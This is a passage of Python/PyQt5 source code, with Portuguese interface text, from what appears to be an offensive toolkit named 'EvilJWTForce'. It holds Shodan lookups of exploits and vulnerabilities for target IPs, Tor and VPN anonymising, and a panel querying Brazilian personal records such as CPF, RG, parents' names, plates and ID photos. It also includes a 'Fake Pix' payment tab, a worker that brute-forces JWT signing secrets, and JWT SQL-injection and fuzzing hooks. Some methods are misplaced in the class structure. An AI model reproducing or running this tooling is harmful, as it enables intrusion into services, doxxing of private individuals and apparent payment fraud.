        self.shodan_hosts_country_btn = QPushButton('🛰 Hosts por País')
        action_h.addWidget(self.shodan_hosts_country_btn)
        self.shodan_hosts_country_btn.clicked.connect(self.shodan_hosts_by_country)
        self.shodan_exploits_btn = QPushButton('🎯 Exploits por Serviço')
        action_h.addWidget(self.shodan_exploits_btn)
        self.shodan_exploits_btn.clicked.connect(self.shodan_search_exploits)
        self.shodan_scan_ports_btn = QPushButton('🔍 Scan Portas Abertas')
        action_h.addWidget(self.shodan_scan_ports_btn)
        self.shodan_scan_ports_btn.clicked.connect(self.shodan_scan_ports)
        self.shodan_tech_btn = QPushButton('💡 Tecnologias Detectadas')
        action_h.addWidget(self.shodan_tech_btn)
        self.shodan_tech_btn.clicked.connect(self.shodan_get_technologies)
        self.shodan_vuln_btn = QPushButton('⚠ Vulnerabilidades')
        action_h.addWidget(self.shodan_vuln_btn)
        self.shodan_vuln_btn.clicked.connect(self.shodan_get_vulnerabilities)
        layout.addLayout(action_h)
        # Buttons
        btn_h = QHBoxLayout()
        self.shodan_search_btn = QPushButton('Pesquisar')
        self.shodan_search_btn.setToolTip('Executar pesquisa no Shodan')
        self.shodan_search_btn.clicked.connect(self.run_shodan_search)
        btn_h.addWidget(self.shodan_search_btn)
        clear_btn = QPushButton('Limpar')
        clear_btn.clicked.connect(lambda: self.shodan_result.clear())
        btn_h.addWidget(clear_btn)
        self.save_html_btn = QPushButton('Salvar HTML')
        self.save_html_btn.setToolTip('Salvar resultados de pesquisa em HTML')
        self.save_html_btn.clicked.connect(self.save_shodan_html)
        btn_h.addWidget(self.save_html_btn)
        layout.addLayout(btn_h)
        # Progress bar para Shodan
        self.shodan_progress = QProgressBar()
        self.shodan_progress.setRange(0, self.shodan_limit_spin.value())
        self.shodan_progress.setValue(0)
        layout.addWidget(self.shodan_progress)
        # Results display
        self.shodan_result = QTextEdit()
        self.shodan_result.setReadOnly(True)
        self.shodan_result.setStyleSheet('background-color: #3a3a3a; color: #eee;')
        layout.addWidget(self.shodan_result)
        self.tabs.addTab(shodan_tab, 'Shodan')

    def run_shodan_search(self):
        """Run a Shodan search with detailed logs and timing."""
        # Assegura que há uma chave Shodan definida
        if not getattr(self, 'shodan_api_key', ''):
            self.connect_shodan()
            if not getattr(self, 'shodan_api_key', ''):
                return
        # Define a chave para as chamadas REST
        os.environ['SHODAN_API_KEY'] = self.shodan_api_key
        # Limpa resultados e inicializa barra de progresso
        self.shodan_result.clear()
        query = self.shodan_query_entry.text().strip()
        limit = self.shodan_limit_spin.value()
        if not query:
            QMessageBox.warning(self, 'Shodan', 'Informe uma query para pesquisa.')
            return
        self.shodan_progress.setRange(0, limit)
        self.shodan_progress.setValue(0)
        # Debug da chave usada
        self.shodan_result.append(f'[DEBUG] Usando SHODAN_API_KEY={self.shodan_api_key}')
        # Início da pesquisa
        start_time = time.time()
        timestamp = QDateTime.currentDateTime().toString("hh:mm:ss")
        self.shodan_result.append(f'[{timestamp}] Iniciando pesquisa Shodan: "{query}" (limite={limit})')
        def log_cb(msg):
            ts = QDateTime.currentDateTime().toString("hh:mm:ss")
            QTimer.singleShot(0, lambda: self.shodan_result.append(f'[{ts}] {msg}'))
        def task():
            # Import do módulo Shodan
            try:
                from modules.shodan_module import search_shodan
            except Exception as e:
                log_cb(f'Erro ao importar módulo Shodan: {e}')
                return
            # Executa a busca
            try:
                data = search_shodan(query, limit, log_cb) or []
                elapsed = time.time() - start_time
                log_cb(f'Pesquisa concluída em {elapsed:.2f}s. Total de resultados: {len(data)}')
                # Atualiza barra de progresso conforme resultados retornam
                for idx, m in enumerate(data, 1):
                    ip = m.get('ip_str', '')
                    port = m.get('port', '')
                    log_cb(f'[{idx}] Host: {ip}:{port}')
                    QTimer.singleShot(0, lambda idx=idx: self.shodan_progress.setValue(idx))
                # Se não houver resultados, indica ao usuário
                if not data:
                    log_cb(f'Nenhum resultado encontrado para "{query}".')
            except Exception as e:
                log_cb(f'Erro na execução do Shodan: {e}')
        threading.Thread(target=task, daemon=True).start()

    def connect_shodan(self):
        """Open dialog to enter Shodan API key and test connection."""
        key, ok = QInputDialog.getText(self, 'Conectar Shodan', 'Digite sua Shodan API Key:')
        if not ok:
            return
        key = key.strip()
        if not key:
            QMessageBox.warning(self, 'Shodan', 'Chave de API vazia.')
            return
        from modules.shodan_module import test_connection
        ok_conn, msg = test_connection(key)
        # Atualiza status e persiste
        if ok_conn:
            self.shodan_api_key = key
            os.environ['SHODAN_API_KEY'] = key
            # Persiste a chave para próximas execuções
            settings = QSettings('EvilJWTForce', 'Settings')
            settings.setValue('shodan_api_key', key)
            self.shodan_status_label.setText('✅ Conectado')
            QMessageBox.information(self, 'Shodan', 'Conexão bem-sucedida!')
        else:
            # Limpa chave inválida
            self.shodan_status_label.setText(f'❌ {msg}')
            settings = QSettings('EvilJWTForce', 'Settings')
            settings.remove('shodan_api_key')
            self.shodan_api_key = ''
            os.environ.pop('SHODAN_API_KEY', None)
            QMessageBox.critical(self, 'Shodan', f'Falha na conexão com Shodan: {msg}')

    def shodan_hosts_by_country(self):
        code, ok = QInputDialog.getText(self, 'Hosts por País', 'País (sigla, ex: BR):')
        if not ok or not code:
            return
        self.shodan_result.clear()
        def task():
            from modules.shodan_module import get_hosts_by_country
            res = get_hosts_by_country(self.shodan_api_key, code, lambda m: None)
            QTimer.singleShot(0, lambda: self.shodan_result.setPlainText(res))
        threading.Thread(target=task, daemon=True).start()

    def shodan_search_exploits(self):
        srv, ok = QInputDialog.getText(self, 'Exploits por Serviço', 'Serviço (ex: apache):')
        if not ok or not srv:
            return
        self.shodan_result.clear()
        def task():
            from modules.shodan_module import search_exploits
            res = search_exploits(self.shodan_api_key, srv, lambda m: None)
            QTimer.singleShot(0, lambda: self.shodan_result.setPlainText(res))
        threading.Thread(target=task, daemon=True).start()

    def shodan_scan_ports(self):
        ip, ok = QInputDialog.getText(self, 'Scan Portas Abertas', 'IP alvo (ex: 1.2.3.4):')
        if not ok or not ip:
            return
        self.shodan_result.clear()
        def task():
            from modules.shodan_module import scan_ports
            res = scan_ports(self.shodan_api_key, ip, lambda m: None)
            QTimer.singleShot(0, lambda: self.shodan_result.setPlainText(res))
        threading.Thread(target=task, daemon=True).start()

    def shodan_get_technologies(self):
        ip, ok = QInputDialog.getText(self, 'Tecnologias Detectadas', 'IP alvo:')
        if not ok or not ip:
            return
        self.shodan_result.clear()
        def task():
            from modules.shodan_module import get_technologies
            res = get_technologies(self.shodan_api_key, ip, lambda m: None)
            QTimer.singleShot(0, lambda: self.shodan_result.setPlainText(res))
        threading.Thread(target=task, daemon=True).start()

    def shodan_get_vulnerabilities(self):
        ip, ok = QInputDialog.getText(self, 'Vulnerabilidades', 'IP alvo:')
        if not ok or not ip:
            return
        self.shodan_result.clear()
        def task():
            from modules.shodan_module import get_vulnerabilities
            res = get_vulnerabilities(self.shodan_api_key, ip, lambda m: None)
            QTimer.singleShot(0, lambda: self.shodan_result.setPlainText(res))
        threading.Thread(target=task, daemon=True).start()

    def export_shodan_results(self):
        """Save current Shodan results to output/shodan_results.txt"""
        text = self.shodan_result.toPlainText()
        os.makedirs('output', exist_ok=True)
        path = os.path.join('output', 'shodan_results.txt')
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(text)
            QMessageBox.information(self, 'Shodan', f'Resultados salvos em {path}')
        except Exception as e:
            QMessageBox.critical(self, 'Shodan', f'Erro ao salvar resultados: {e}')

    def save_shodan_html(self):
        """Save Shodan search results as HTML"""
        fname, _ = QFileDialog.getSaveFileName(self, 'Salvar HTML', '', 'HTML Files (*.html);;All Files (*)')
        if fname:
            try:
                with open(fname, 'w', encoding='utf-8') as f:
                    f.write(self.shodan_result.toHtml())
                QMessageBox.information(self, 'Shodan', f'Resultados salvos em {fname}')
            except Exception as e:
                QMessageBox.critical(self, 'Shodan', f'Erro ao salvar HTML: {e}')

    def browse_vpn_config(self):
        fname, _ = QFileDialog.getOpenFileName(self, 'Select OpenVPN config', '', 'OVPN Files (*.ovpn);;All Files (*)')
        if fname:
            self.vpn_config_edit.setText(fname)

    def connect_vpn(self):
        config = self.vpn_config_edit.text().strip()
        if not config:
            QMessageBox.warning(self, 'Aviso', 'Selecione um arquivo .ovpn primeiro.')
            return
        network_manager.start_vpn(config)
        QMessageBox.information(self, 'VPN', 'VPN iniciada.')

    def disconnect_vpn(self):
        network_manager.stop_vpn()
        QMessageBox.information(self, 'VPN', 'VPN desconectada.')

    def browse_tor_path(self):
        fname, _ = QFileDialog.getOpenFileName(self, 'Selecione tor.exe', '', 'Executáveis (*.exe);;All Files (*)')
        if fname:
            self.tor_path_edit.setText(fname)

    def toggle_tor(self, state):
        enabled = state == Qt.Checked
        tor_path = self.tor_path_edit.text().strip() or 'tor'
        if enabled:
            try:
                network_manager.start_tor(tor_path)
                network_manager.set_tor_proxy_env(True)
                QMessageBox.information(self, 'Tor', 'Tor iniciado e proxy configurado.')
            except Exception as e:
                QMessageBox.critical(self, 'Tor', f'Erro ao iniciar Tor: {e}')
                self.tor_checkbox.setChecked(False)
        else:
            network_manager.stop_tor()
            network_manager.set_tor_proxy_env(False)
            QMessageBox.information(self, 'Tor', 'Tor parado e proxy removido.')

    def open_vpn_logs_dialog(self):
        """Open a dialog displaying VPN logs and current IP/location in real time."""
        if not hasattr(self, 'vpn_log_dialog'):
            self.vpn_log_dialog = QDialog(self)
            self.vpn_log_dialog.setWindowTitle('VPN Logs e Status')
            layout = QVBoxLayout(self.vpn_log_dialog)
            self.vpn_ip_label = QLabel('IP: N/A')
            layout.addWidget(self.vpn_ip_label)
            self.vpn_log_text = QTextEdit()
            self.vpn_log_text.setReadOnly(True)
            layout.addWidget(self.vpn_log_text)
            self.vpn_log_timer = QTimer(self)
            self.vpn_log_timer.timeout.connect(self.update_vpn_logs)
            self.vpn_ip_timer = QTimer(self)
            self.vpn_ip_timer.timeout.connect(self.update_ip_location)
            self.vpn_log_dialog.finished.connect(self.stop_vpn_log_timers)
        # Start updating logs and IP/location
        self.vpn_log_timer.start(1000)
        self.vpn_ip_timer.start(5000)
        self.vpn_log_dialog.resize(600, 400)
        self.vpn_log_dialog.exec_()

    def update_vpn_logs(self):
        """Read new lines from VPN process stdout/stderr and append to dialog."""
        proc = network_manager.vpn_proc
        if proc:
            for stream in (proc.stdout, proc.stderr):
                if stream:
                    while True:
                        line = stream.readline()
                        if not line:
                            break
                        text = line.decode('utf-8', errors='ignore').rstrip()
                        self.vpn_log_text.append(text)

    def update_ip_location(self):
        """Fetch external IP and geolocation and update label."""
        try:
            resp = requests.get('https://ipinfo.io/json', timeout=5)
            data = resp.json()
            ip = data.get('ip', 'N/A')
            city = data.get('city', '')
            region = data.get('region', '')
            country = data.get('country', '')
            self.vpn_ip_label.setText(f'IP: {ip} - {city}, {region}, {country}')
        except Exception:
            pass

    def stop_vpn_log_timers(self):
        """Stop the VPN log and IP/location update timers."""
        try:
            self.vpn_log_timer.stop()
            self.vpn_ip_timer.stop()
        except Exception:
            pass

    # Banco de Dados com API VoidSync
    def setup_database_tab(self):
        """Setup da aba Banco de Dados usando VoidSyncClient"""
        db_tab = QWidget()
        db_layout = QVBoxLayout(db_tab)
        # Formulário de pesquisa
        form = QFormLayout()
        # Tipo de Busca: antigos tipos do VoidSync e novos tipos de APIs
        self.db_search_type = QComboBox()
        self.db_search_type.addItems([
            'cpf','cnpj','rg','cpfsimpl','rgsimpl','nome','pis','titulo','telefone','email',
            'cns','mae','pai','placa','chassi','renavam','motor','fotorj','fotosp',
            'funcionarios','razão social',
            'BrasilAPI','ReceitaWS','Câmara','CensusGov','Veriphone','HaveIBeenPwned',
            'SFN Cloudwalk','SFN Volvo','HRI.fi','Kijang','DataGovTW'
        ])
        form.addRow('Tipo de Busca:', self.db_search_type)
        self.db_search_input = QLineEdit()
        form.addRow('Consulta:', self.db_search_input)
        # Botões de ação
        btn_h = QHBoxLayout()
        search_btn = QPushButton('🔍 Pesquisar')
        search_btn.clicked.connect(self.handle_database_search)
        save_btn = QPushButton('⬇️ Salvar Resultado')
        save_btn.clicked.connect(self.save_database_results)
        btn_h.addWidget(search_btn)
        btn_h.addWidget(save_btn)
        form.addRow(btn_h)
        db_layout.addLayout(form)
        # Área de resultados
        self.db_results = QTextEdit()
        self.db_results.setReadOnly(True)
        self.db_results.setStyleSheet('background-color: #3a3a3a; color: #eee;')
        db_layout.addWidget(self.db_results)
        self.tabs.addTab(db_tab, 'DB')

    def handle_database_search(self):
        # Integração: escolhe o tipo de busca e executa via VoidSync ou db_integrator
        search_type = self.db_search_type.currentText()
        term = self.db_search_input.text().strip()
        if not term:
            QMessageBox.warning(self, 'Banco de Dados', 'Informe um valor para consulta.')
            return
        self.db_results.clear()
        try:
            # VoidSync base types
            from modules.voidsync_api import VoidSyncClient
            client = VoidSyncClient(config.get('voidsync', {}).get('access_key', ''))
            # Outras integrações
            from modules.db_integrator import (
                search_cnpj_receitaws, query_brasilapi_cpf, fetch_data_bacen_json,
                search_camara_deputados, query_census, check_phone_veriphone,
                check_leaks_hibp, scrape_integration_hri_fi, get_kijang_bank_data,
                explore_data_gov_tw
            )
            # Route based on type
            if search_type in ['cpf','cnpj','rg','cpfsimpl','rgsimpl','nome','pis','titulo','telefone','email',
                                'cns','mae','pai','placa','chassi','renavam','motor','fotorj','fotosp',
                                'funcionarios','razão social']:
                resp = client.search(term, search_type)
                data = client.parse_response(resp)
            elif search_type == 'ReceitaWS':
                data = search_cnpj_receitaws(term)
            elif search_type == 'BrasilAPI':
                data = query_brasilapi_cpf(term)
            elif search_type == 'Câmara':
                data = search_camara_deputados(term)
            elif search_type == 'CensusGov':
                data = query_census(term)
            elif search_type == 'Veriphone':
                data = check_phone_veriphone(term)
            elif search_type == 'HaveIBeenPwned':
                data = check_leaks_hibp(term)
            elif search_type == 'SFN Cloudwalk':
                data = fetch_data_bacen_json('sfn_cloudwalk.json')
            elif search_type == 'SFN Volvo':
                data = fetch_data_bacen_json('sfn_volvo.json')
            elif search_type == 'HRI.fi':
                data = scrape_integration_hri_fi(term)
            elif search_type == 'Kijang':
                data = get_kijang_bank_data(term)
            elif search_type == 'DataGovTW':
                data = explore_data_gov_tw(term)
            else:
                data = {'error': 'Tipo de busca desconhecido'}
        except Exception as e:
            logging.error(f'DB query error: {e}')
            QMessageBox.critical(self, 'Banco de Dados', f'Erro na consulta: {e}')
            return
        # Exibir resultados formatados
        import json
        formatted = json.dumps(data, ensure_ascii=False, indent=2)
        self.db_results.setPlainText(formatted)
        self._last_db_text = formatted

    def save_database_results(self):
        try:
            Path('output/voidsync_queries.txt').parent.mkdir(parents=True, exist_ok=True)
            with open('output/voidsync_queries.txt','a',encoding='utf-8') as f:
                f.write(self._last_db_text + '\n\n')
            QMessageBox.information(self, 'Banco de Dados', 'Resultados salvos em output/voidsync_queries.txt')
        except Exception as e:
            QMessageBox.critical(self, 'Banco de Dados', f'Erro ao salvar: {e}')

    def handle_test_external_api(self, provider):
        """Testa conexão com APIs externas (IPStack, MarketStack, WeatherStack, Fixer, NumVerify)."""
        from modules.api_clients.external_data_api import IPStackAPI, MarketStackAPI, WeatherStackAPI, FixerAPI, NumVerifyAPI
        from PyQt5.QtWidgets import QMessageBox
        try:
            if provider == 'IPStack':
                res = IPStackAPI.get_location('8.8.8.8')
            elif provider == 'MarketStack':
                res = MarketStackAPI.get_stock('AAPL')
            elif provider == 'WeatherStack':
                res = WeatherStackAPI.get_weather('London')
            elif provider == 'Fixer':
                res = FixerAPI.get_conversion('USD', 'EUR')
            elif provider == 'NumVerify':
                res = NumVerifyAPI.validate('+5511999999999')
            else:
                res = {'error': 'Provedor desconhecido'}
            if res and 'error' not in res:
                QMessageBox.information(self, 'Testar API', f'{provider} conectado com sucesso.')
            else:
                msg = res.get('error', 'Desconhecido')
                QMessageBox.critical(self, 'Testar API', f'Erro ao conectar {provider}: {msg}')
        except Exception as e:
            QMessageBox.critical(self, 'Testar API', f'Erro ao testar {provider}: {str(e)}')

    def preencher_fakepix_com_scan(self):
        """Aplica resultados do Scan na aba Fake Pix"""
        try:
            with open('output/fakepix_scan_cache.json','r',encoding='utf-8') as f:
                data = json.load(f)
            txid = data.get('pix_txids',[None])[0] or ''
            endpoint = data.get('webhook_candidates',[None])[0] or ''
            self.pix_txid.setText(txid)
            self.pix_endpoint.setText(endpoint)
            self.scan_log.append('[✓] Dados aplicados na aba Fake Pix.')
        except Exception as e:
            self.scan_log.append(f'[!] Erro ao aplicar dados: {e}')

    def save_jwt_results(self, attack_type):
        """Save JWT attack results to a file"""
        if attack_type == 'brute':
            content = self.jwt_brute_log.toPlainText()
            filename = f"jwt_bruteforce_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        else:  # sqli
            content = self.jwt_sqli_log.toPlainText()
            filename = f"jwt_sqli_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        filepath, _ = QFileDialog.getSaveFileName(
            self,
            "Salvar Resultados",
            filename,
            "Text Files (*.txt);;All Files (*)"
        )

        if filepath:
            try:
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(content)
                QMessageBox.information(self, "Sucesso", "Resultados salvos com sucesso!")
            except Exception as e:
                QMessageBox.critical(self, "Erro", f"Erro ao salvar resultados: {str(e)}")

    def view_jwt_results(self, attack_type):
        """View saved JWT attack results"""
        filepath, _ = QFileDialog.getOpenFileName(
            self,
            "Abrir Resultados",
            "",
            "Text Files (*.txt);;All Files (*)"
        )

        if filepath:
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                if attack_type == 'brute':
                    self.jwt_brute_log.setText(content)
                else:  # sqli
                    self.jwt_sqli_log.setText(content)
            except Exception as e:
                QMessageBox.critical(self, "Erro", f"Erro ao abrir resultados: {str(e)}")

# Logger para enriquecimento do Pix
os.makedirs('logs', exist_ok=True)
fake_pix_logger = logging.getLogger('fake_pix_enrichment')
fp_handler = logging.FileHandler('logs/fake_pix_enrichment.log')
fp_handler.setFormatter(logging.Formatter('[%(asctime)s] %(message)s', '%Y-%m-%d %H:%M:%S'))
fake_pix_logger.addHandler(fp_handler)
fake_pix_logger.setLevel(logging.INFO)

class JWTBruteWorker(QObject):
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    result = pyqtSignal(str)
    
    def __init__(self, token, wordlist):
        super().__init__()
        self.token = token
        self.wordlist = wordlist
        self._is_running = True
        self.batch_size = 1000  # Número de palavras por lote
        
    def _read_wordlist_in_batches(self):
        """Lê a wordlist em lotes para economizar memória"""
        try:
            with open(self.wordlist, 'r', encoding='utf-8') as f:
                batch = []
                for line in f:
                    if not self._is_running:
                        break
                    word = line.strip()
                    if word:
                        batch.append(word)
                        if len(batch) >= self.batch_size:
                            yield batch
                            batch = []
                if batch:  # Último lote
                    yield batch
        except Exception as e:
            self.log.emit(f"Erro ao ler wordlist: {str(e)}")
            return
            
    def _count_total_words(self):
        """Conta o número total de palavras na wordlist"""
        try:
            count = 0
            with open(self.wordlist, 'r', encoding='utf-8') as f:
                for line in f:
                    if line.strip():
                        count += 1
            return count
        except Exception as e:
            self.log.emit(f"Erro ao contar palavras: {str(e)}")
            return 0
            
    def run(self):
        try:
            # Conta total de palavras primeiro
            total_words = self._count_total_words()
            if total_words == 0:
                self.log.emit("Wordlist vazia ou inválida")
                return
                
            self.log.emit(f"Total de palavras na wordlist: {total_words}")
            words_processed = 0
            
            # Processa em lotes
            for batch in self._read_wordlist_in_batches():
                if not self._is_running:
                    break
                    
                for word in batch:
                    if not self._is_running:
                        break
                        
                    try:
                        # Tenta decodificar com a palavra atual
                        decoded = jwt.decode(self.token, word, algorithms=['HS256'])
                        self.result.emit(word)
                        return
                    except:
                        pass
                        
                    # Atualiza progresso
                    words_processed += 1
                    progress = int((words_processed * 100) / total_words)
                    self.progress.emit(progress)
                    
                    # Log a cada 100 palavras para não sobrecarregar a UI
                    if words_processed % 100 == 0:
                        self.log.emit(f"Testando chave: {word}... ({words_processed}/{total_words})")
                
        except Exception as e:
            self.log.emit(f"Erro durante o ataque: {str(e)}")
        finally:
            self.finished.emit()
            
    def stop(self):
        self._is_running = False

    def run_jwt_bruteforce(self):
        # Get token and wordlist
        token = self.jwt_token_input.text().strip()
        wordlist = self.jwt_wordlist_input.text().strip()
        
        if not token or not wordlist:
            QMessageBox.warning(self, "Aviso", "Token e wordlist são obrigatórios")
            return
            
        # Disable start button and enable stop
        self.jwt_brute_start_btn.setEnabled(False)
        self.jwt_brute_stop_btn.setEnabled(True)
        
        # Show progress bar
        self.jwt_brute_progress.setVisible(True)
        self.jwt_brute_progress.setValue(0)
        
        # Limpa o log anterior
        self.jwt_brute_log.clear()
        
        # Create worker thread
        self.jwt_brute_thread = QThread()
        self.jwt_brute_worker = JWTBruteWorker(token, wordlist)
        self.jwt_brute_worker.moveToThread(self.jwt_brute_thread)
        
        # Connect signals
        self.jwt_brute_thread.started.connect(self.jwt_brute_worker.run)
        self.jwt_brute_worker.finished.connect(self.jwt_brute_thread.quit)
        self.jwt_brute_worker.finished.connect(self.jwt_brute_worker.deleteLater)
        self.jwt_brute_thread.finished.connect(self.jwt_brute_thread.deleteLater)
        
        # Connect progress and log signals
        self.jwt_brute_worker.progress.connect(self.jwt_brute_progress.setValue)
        self.jwt_brute_worker.log.connect(self.jwt_brute_log.append)
        self.jwt_brute_worker.result.connect(self._handle_jwt_brute_result)
        
        # Start thread
        self.jwt_brute_thread.start()

    def stop_jwt_bruteforce(self):
        """Stop the JWT bruteforce attack"""
        if hasattr(self, 'jwt_brute_worker'):
            self.jwt_brute_worker.stop()
            self.jwt_brute_start_btn.setEnabled(True)
            self.jwt_brute_stop_btn.setEnabled(False)
            self.jwt_brute_progress.setVisible(False)
            self.jwt_brute_log.append("\n[!] Ataque interrompido pelo usuário")

class FuzzWorker(QObject):
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    result = pyqtSignal(dict)

    def __init__(self, endpoint, headers_body, fuzz_type, template):
        super().__init__()
        self.endpoint = endpoint
        self.headers_body = headers_body
        self.fuzz_type = fuzz_type
        self.template = template
        self._stop_flag = False

    def stop(self):
        self._stop_flag = True

    def run(self):
        try:
            from core.fuzzer import run_advanced_fuzzing
            
            def log_cb(msg, color=None):
                self.log.emit(msg)
                
            def progress_cb(val):
                self.progress.emit(val)
                
            def result_cb(res):
                self.result.emit(res)
                
            run_advanced_fuzzing(
                self.endpoint,
                self.headers_body,
                self.fuzz_type,
                self.template,
                log_cb,
                progress_cb,
                self._stop_flag
            )
            
        except Exception as e:
            self.log.emit(f"Erro no fuzzing: {str(e)}")
        finally:
            self.finished.emit()

def run_fuzz(self):
    """Start advanced fuzzing with live logs and progress"""
    endpoint = self.fuzz_endpoint_entry.text().strip()
    if not endpoint:
        QMessageBox.warning(self, 'Fuzzing', 'Informe o endpoint alvo.')
        return
        
    headers_body = self.fuzz_input.toPlainText()
    fuzz_type = self.fuzz_type_combo.currentText()
    template = self.fuzz_template_combo.currentText()
    
    # Preparar UI
    self.fuzz_progress.setValue(0)
    self.fuzz_log.clear()
    self.fuzz_start_btn.setEnabled(False)
    self.fuzz_stop_btn.setEnabled(True)
    
    # Criar worker thread
    self.fuzz_worker = FuzzWorker(endpoint, headers_body, fuzz_type, template)
    self.fuzz_worker_thread = QThread()
    self.fuzz_worker.moveToThread(self.fuzz_worker_thread)
    
    # Conectar sinais
    self.fuzz_worker_thread.started.connect(self.fuzz_worker.run)
    self.fuzz_worker.finished.connect(self.fuzz_worker_thread.quit)
    self.fuzz_worker.finished.connect(self.finish_fuzz)
    self.fuzz_worker.log.connect(lambda msg: self.fuzz_log.append(msg))
    self.fuzz_worker.progress.connect(self.fuzz_progress.setValue)
    self.fuzz_worker.result.connect(self._handle_fuzz_result)
    
    # Iniciar thread
    self.fuzz_worker_thread.start()
    
    # Feedback inicial
    self.fuzz_log.append('Fuzzing iniciado em segundo plano...')

def stop_fuzz(self):
    """Abort fuzzing process"""
    if hasattr(self, 'fuzz_worker'):
        self.fuzz_worker.stop()
        self.fuzz_log.append('Fuzzing cancelado pelo usuário')
        self.fuzz_stop_btn.setEnabled(False)
        self.fuzz_start_btn.setEnabled(True)

def finish_fuzz(self):
    """Cleanup after fuzzing completes"""
    self.fuzz_start_btn.setEnabled(True)
    self.fuzz_stop_btn.setEnabled(False)
    self.fuzz_log.append('Fuzzing finalizado.')

def _handle_fuzz_result(self, result):
    """Handle fuzzing results"""
    if result.get('status') == 'complete':
        self.fuzz_log.append('Fuzzing concluído com sucesso!')
    else:
        self.fuzz_log.append(f'Fuzzing finalizado com status: {result.get("status", "desconhecido")}')
